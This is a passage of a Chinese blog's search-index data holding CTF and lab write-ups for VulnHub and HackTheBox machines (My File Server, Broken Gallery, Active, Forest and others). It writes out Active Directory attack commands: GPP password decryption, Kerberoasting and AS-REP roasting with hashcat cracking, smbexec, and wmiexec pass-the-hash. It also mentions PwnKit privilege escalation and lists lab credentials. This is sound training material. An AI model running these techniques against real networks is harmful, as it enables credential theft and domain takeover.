nfs端口，这里遇到一个问题，似乎只有同一网段才能挂载成功：\nNFS内容看起来和FTP一样，但是权限高不少：\n发现多个用户名，根据家目录和环境判断，其中smbuser大概率是可以登录的：\n80端口：\n发现密码rootroot1\n但是ssh连接失败：\n那就剩下最后一个端口：445\n匿名登录：\n说实话打到这里基本上，已经没有思路了，基本能看的地方都看了，手里拿到了一个账户和密码，但是无法登录，看了一下wp，让我登录FTP再看看，没想到再次登录FTP的：\n生成公私钥：\n上传：\n这里有坑，使用kali默认的私钥名字连不上，改成其他名字一下就可以了\n提权 有GCC可以用内核提权：\n随便找了一个2021-4034：\n总结 此靶机不是单纯的集中某个技能点，而是需要反复的进行信息收集，极其容易导致遗漏。\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x010-my-file-server-1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE607803e9db4e385a56041f94df03737c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE240a54f550c9359a780308c07f403444%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEdf0dece76cb4302705883bc750ea25dd%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"信息收集\"\u003e信息收集\u003c/h1\u003e\n\u003cp\u003e21端口，有匿名登录，但是目前来看没有发现什么有效的东西：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE677f3992f3e0efff0fe2c03e96da0ba8%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e2049 nfs端口，这里遇到一个问题，似乎只有同一网段才能挂载成功：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8007cff462e94048660b983350617ae7%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003eNFS内容看起来和FTP一样，但是权限高不少：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf375917bae4dd8a17b222f00e470afa3%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEbb98612aa38d32ded88fcafb7336aabf%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE109d19ed67363acb230a99bbd97e3209%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE50d6e5cd0e6a2a2f46411b02eaa27f3e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE97b604408d6b3284662362fcedb6acdc%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现多个用户名，根据家目录和环境判断，其中smbuser大概率是可以登录的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5317791457913edc6ac6a9ad0860b71d%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e80端口：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7ee02d9077943cf97805a4e36613514b%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEae947895ae357079bbd9cdaf81bb4d6e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现密码rootroot1\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE16a0df2d3c0a92a7fabd73b97d0be665%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e但是ssh连接失败：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE071efa53ccab0d3ddac78cc78582e819%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e那就剩下最后一个端口：445\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE438cea2412426bd21bfbc4e1c10e90d8%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e匿名登录：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE83f99c60a3f2f3697796a29a70c87b16%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1bbe1161602cbe40f7a46b5dfd5c26bf%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e说实话打到这里基本上，已经没有思路了，基本能看的地方都看了，手里拿到了一个账户和密码，但是无法登录，看了一下wp，让我登录FTP再看看，没想到再次登录FTP的：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEc7134c5e3fb395216419ede80cc585be%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e生成公私钥：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE108ba492ec7b53f957a68f6787ae116e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e上传：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4b584b30ca7646c25a77a865c385aa39%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里有坑，使用kali默认的私钥名字连不上，改成其他名字一下就可以了\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e有GCC可以用内核提权：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE79fe9927799a5d921bc450f15d8075d3%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e随便找了一个2021-4034：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE7b3aaa2c0007045e363d161bd0eb24b0%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"总结\"\u003e总结\u003c/h1\u003e\n\u003cp\u003e此靶机不是单纯的集中某个技能点，而是需要反复的进行信息收集，极其容易导致遗漏。\u003c/p\u003e","title":"0x010 My File Server 1"},{"content":"端口扫描 WEB渗透 大致看了一下，目录浏览了都，就没必要目录扫描了，发现readme.md的时候，我就觉得不妙：\n16进制字符串？\n然后大致看了一下图片，暂时没发现有用信息：\n我花了很长时间研究这个16进制文件，甚至尝试了强行爆破，但是没有太多办法，只能查看WP了：\n关于二进制恢复和查看信息的方法：\nxxd工具：\nxxd -r -ps xxxx 可读字符查看，strings\nstrings xxx 恢复成图片就可以看到隐藏信息了：\n后续根据这个图片和网站生成针对性的字典，就可以爆破出SSH密码了，密码为broken:broken\n提权 提权就比较简单了，sudo\n总结 其实我不是很喜欢这个靶场，因为偏离实战太多，但是站在靶场设计者的角度思考，可能是想要补全一些关于隐藏信息的利用方式。\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x011-broken-gallery/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEf44623b5f75937cb5a8a04f722234d1c%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE47292f9b3fcda8b6bfd726dc07c3afe4%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"web渗透\"\u003eWEB渗透\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3ed52382191572118c01223551bc1cfb%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e大致看了一下，目录浏览了都，就没必要目录扫描了，发现readme.md的时候，我就觉得不妙：\u003c/p\u003e\n\u003cp\u003e16进制字符串？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEefa2e4e6bd9739b13c5222b8c98ca0f3%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e然后大致看了一下图片，暂时没发现有用信息：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5404203c3e37ed592f62009b205803ed%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e我花了很长时间研究这个16进制文件，甚至尝试了强行爆破，但是没有太多办法，只能查看WP了：\u003c/p\u003e\n\u003cp\u003e关于二进制恢复和查看信息的方法：\u003c/p\u003e\n\u003cp\u003exxd工具：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003exxd -r -ps xxxx\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e可读字符查看，strings\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003estrings xxx\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE686ec1d9acfd0ca31dd920d9ecdf185a%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e恢复成图片就可以看到隐藏信息了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE8fb0868e9423c689a2bf3ec14cd8ad85%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e后续根据这个图片和网站生成针对性的字典，就可以爆破出SSH密码了，密码为broken:broken\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e提权就比较简单了，sudo\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE5356dace1fa9f76a48a0234021e59307%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"总结\"\u003e总结\u003c/h1\u003e\n\u003cp\u003e其实我不是很喜欢这个靶场，因为偏离实战太多，但是站在靶场设计者的角度思考，可能是想要补全一些关于隐藏信息的利用方式。\u003c/p\u003e","title":"0x011 Broken Gallery"},{"content":"端口扫描 获取立足点 开始思考，从哪儿开始看起呢？还是smba吧：\n用smbclient简单看了一下，内容好像有点多，但是挂载到本地失败了，只能慢慢看了：\n里面其实有东西的目录，应该就是这个目录了：\n问了一下GPT，大概知道是用来记录组策略的，但是不知道有什么用：\n发现疑似账号密码：\n这里其实是我的思考不够，其实我是知道这是普通账户，但是目标主机是域控的，但是我对这方面的知识不自信导致，我一直在尝试，通过这个账号密码来获取shell，并且这里的密码是加密的，需要解密：\ngpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\n密码为：GPPstillStandingStrong2k18\n使用该凭证再次登录smb:\n登录后发现flag:\n提权 我尝试使用该凭证进行登录获取shell，但是发现都失败了，rpc拒绝或者相关smb目录没有写入权限；\n尝试获取其他立足点，其实我感觉这一步更像是域内提权枚举：\nkerberoasting 使用GetUserSPNs.py查询所有注册于用户下的spn:\npython GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18\n获取ST，保存为hashcat能爆破的格式：\npython /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt\n爆破：\nhashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt \u0026ndash;force\nTicketmaster1968\nsmbexec:\npython /usr/share/doc/python3-impacket/examples/smbexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100\n2ad2d3d25064e6511303bc5a1bb40ac4\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x012-active/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE2b79f81f1e994947facb32e1d33427b9image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE57929fea3eb2c20e9a81cb222fdc2be2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003e开始思考，从哪儿开始看起呢？还是smba吧：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEe2ba0e29d1b9dba9ac848bc79d363f4dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e用smbclient简单看了一下，内容好像有点多，但是挂载到本地失败了，只能慢慢看了：\u003c/p\u003e\n\u003cp\u003e里面其实有东西的目录，应该就是这个目录了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE929b2ab801ddc22197d678d5b7b5f4c3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e问了一下GPT，大概知道是用来记录组策略的，但是不知道有什么用：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE87ab11f980a529d243a7b64203c532cfimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现疑似账号密码：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd7d244a94d67021c2c41a4546cb9562eimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里其实是我的思考不够，其实我是知道这是普通账户，但是目标主机是域控的，但是我对这方面的知识不自信导致，我一直在尝试，通过这个账号密码来获取shell，并且这里的密码是加密的，需要解密：\u003c/p\u003e\n\u003cp\u003egpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\u003c/p\u003e\n\u003cp\u003e密码为：GPPstillStandingStrong2k18\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE9bedd112f49203bcdfaa39d7ab9e3eb4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e使用该凭证再次登录smb:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE440f4d2843d061cfa22720a98c061501image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE08147a54fd1836d6a1164e3cc671b872image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e登录后发现flag:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE537bd27ee83c3e4a88037526309a618aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e我尝试使用该凭证进行登录获取shell，但是发现都失败了，rpc拒绝或者相关smb目录没有写入权限；\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE21b1337ec915a036acf313ff94cfe1e7image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e尝试获取其他立足点，其实我感觉这一步更像是域内提权枚举：\u003c/p\u003e\n\u003ch1 id=\"kerberoasting\"\u003ekerberoasting\u003c/h1\u003e\n\u003cp\u003e使用GetUserSPNs.py查询所有注册于用户下的spn:\u003c/p\u003e\n\u003cp\u003epython GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEd4ea9064ac216fbdda4e886205dc6e25image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e获取ST，保存为hashcat能爆破的格式：\u003c/p\u003e\n\u003cp\u003epython /home/kali/Desktop/HTB/impacket/examples/GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -outputfile hash.txt\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE88b2ee81d90310dae17659e624785e0aimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e爆破：\u003c/p\u003e\n\u003cp\u003ehashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt \u0026ndash;force\u003c/p\u003e\n\u003cp\u003eTicketmaster1968\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE5b8fa2eeaa852240dda639d8e2f24790image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003esmbexec:\u003c/p\u003e\n\u003cp\u003epython /usr/share/doc/python3-impacket/examples/smbexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100\u003c/p\u003e","title":"0X012 Active"},{"content":"端口扫描 渗透 web没发现问题，去找mysql的问题，直接开始爆破，发现被封了，第二天直接登录发现可以无密码：\n本来是想直接写webshell的，看来没成功，就算了，进行一下信息收集：\nmistic | testP@$$swordmistic\n提权 计划任务提权？\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x012-dpwwn-1-/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE1f0727e791e5d361babce67301cc1809%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003eweb没发现问题，去找mysql的问题，直接开始爆破，发现被封了，第二天直接登录发现可以无密码：\u003c/p\u003e\n\u003cp\u003e本来是想直接写webshell的，看来没成功，就算了，进行一下信息收集：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE248bacdf89021b9f019ca1bef4541829%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE965d2782fe1912683dbf5cb285426fd5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003emistic   | testP@$$swordmistic\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e计划任务提权？\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE4be0d39f45116e66bfa8af0d116420ea%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCEabbe5569312e1be757dce04ea33cc0a5%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE3fce700795054f0835f4332c24ae197e%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE9c055e31b09972adca71e35ede944292%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e","title":"0x012 dpwwn 1 "},{"content":"端口扫描 获取立足点 smb无法利用，但是ldap存在匿名访问：\n查询所有用户：\nldapsearch -x -H ldap://10.10.10.161:389 -u \u0026rsquo;\u0026rsquo; -w \u0026rsquo;\u0026rsquo; -b \u0026ldquo;DC=htb,DC=local\u0026rdquo; \u0026ldquo;(\u0026amp;(objectCategory=person)(objectClass=user))\u0026rdquo; |grep dn\n经过一段处理：\n把用户名提取出来：\n拿到所有的用户名，几个想法：1、密码喷洒；2、AS-REP Roasting\n用impacket工具包的GetNPUsers.py进行爆破，尝试获取hash\npython ../impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -usersfile username.txt -format john htb.local/\n发现可用：\n破解hash:\ns3rvice ($krb5asrep$svc-alfresco@HTB.LOCAL)\n5985开启，可用通过winrm getshell:\n提权 使用bloodhunnd:\n发现两条路径：\n第一条是，CanPSRemote，通过登录来获取域管理员权限，但是前提是使用本地提权，然后DCSYNC，但是这条路不完全有效，后面看了一下，似乎不让读取系统信息，也就不要太好本地提权了：\n第二条是通过EXCHANGE WINDOWS PERMISSIONS@HTB.LOCALL这个组有完全控制权：bloodhound给的建议是给用户添加dcsync权限：\n那么如何进入EXCHANGE WINDOWS PERMISSIONS@HTB.LOCALL组呢：\nbloodhound告诉我们，SVC-ALFRESCO@HTB.LOCAL是可以通过添加账户来进入这个组的：\n也就是说，我们可以赋予一个用户dcsync权限：\n先使用SVC-ALFRESCO@HTB.LOCAL创建一个属于EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL组的用户：\n赋予dcsync权限：\n不知道哪里有问题，secretsdump失败了，使用powershell脚本试试：\n看来是权限没给上，再研究一下：\n给上了，这次导出hash成功了：\nhash登录：\nwmiexec.py administrator@10.10.10.161 -hashes \u0026lsquo;aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6\u0026rsquo;\na3c166fcef465897b552ea3f9d2c1eba\n总结 这个靶场的核心是使用bloodhound，对bloodhound的使用和理解有一定要求，如果有域内扎实权限基础的话，会更好打一些 ","permalink":"https://yangzhuzai.github.io/posts/htb/0x013-forest/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE93fdbc1cf8437edf1e751023e9ed1e2bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE1e68350840d2018df4ed107ffb3f6c08image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE033784e1aad5bf646aee9b3abd881f80image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"获取立足点\"\u003e获取立足点\u003c/h1\u003e\n\u003cp\u003esmb无法利用，但是ldap存在匿名访问：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEc2050611b4266ff071f8d900185cfb69image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e查询所有用户：\u003c/p\u003e\n\u003cp\u003eldapsearch -x -H ldap://10.10.10.161:389 -u \u0026rsquo;\u0026rsquo; -w \u0026rsquo;\u0026rsquo; -b \u0026ldquo;DC=htb,DC=local\u0026rdquo; \u0026ldquo;(\u0026amp;(objectCategory=person)(objectClass=user))\u0026rdquo; |grep dn\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEfe4307047ea47ceafd2b1efe1def47d1image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e经过一段处理：\u003c/p\u003e\n\u003cp\u003e把用户名提取出来：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE64f411aa6c41500447fed65e433ecdc4image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e拿到所有的用户名，几个想法：1、密码喷洒；2、AS-REP Roasting\u003c/p\u003e\n\u003cp\u003e用impacket工具包的GetNPUsers.py进行爆破，尝试获取hash\u003c/p\u003e\n\u003cp\u003epython ../impacket/examples/GetNPUsers.py -dc-ip 10.10.10.161 -usersfile username.txt -format john htb.local/\u003c/p\u003e\n\u003cp\u003e发现可用：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEca0d1df87d377c387427b0c959ac35b2image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e破解hash:\u003c/p\u003e\n\u003cp\u003es3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE8320a03326f3360b22481ebb4298c5b3image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e5985开启，可用通过winrm getshell:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb8bd0e5f6b4ae711c2d344b99403dcacimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE43c068ea933f27d2853b15eddedeec1dimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"提权\"\u003e提权\u003c/h1\u003e\n\u003cp\u003e使用bloodhunnd:\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb54eddfd1c767692663810ea6b449e24image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e发现两条路径：\u003c/p\u003e\n\u003cp\u003e第一条是，CanPSRemote，通过登录来获取域管理员权限，但是前提是使用本地提权，然后DCSYNC，但是这条路不完全有效，后面看了一下，似乎不让读取系统信息，也就不要太好本地提权了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCE50639070763fb043c8fb3a628461dedfimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e第二条是通过EXCHANGE WINDOWS \u003ca href=\"mailto:PERMISSIONS@HTB.LOCALL\"\u003ePERMISSIONS@HTB.LOCALL\u003c/a\u003e这个组有完全控制权：bloodhound给的建议是给用户添加dcsync权限：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/htb_img/WEBRESOURCEb406f0a27830d6d156e8a207be4c40bfimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e那么如何进入EXCHANGE WINDOWS \u003ca href=\"mailto:PERMISSIONS@HTB.LOCALL\"\u003ePERMISSIONS@HTB.LOCALL\u003c/a\u003e组呢：\u003c/p\u003e","title":"0X013 Forest"},{"content":"端口扫描 渗透 WEB\nSMB\n发现密码\n提权 发现aveng用户的账号密码\necho \u0026ldquo;user:aveng\u0026rdquo;\necho \u0026ldquo;password:kaizen+80\u0026rdquo;\n","permalink":"https://yangzhuzai.github.io/posts/vulnhub/0x013-westwild-1.1/","summary":"\u003ch1 id=\"端口扫描\"\u003e端口扫描\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE6136c856ad93dc5c99736b2d864f4bff%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/vulnhub_img/WEBRESOURCE45e092fd974183d2bf74983c2b4d3a34%e6%88%aa%e5%9b%be.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003ch1 id=\"渗透\"\u003e渗透\u003c/h1\u003e\n\u003cp\u003eWEB\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" 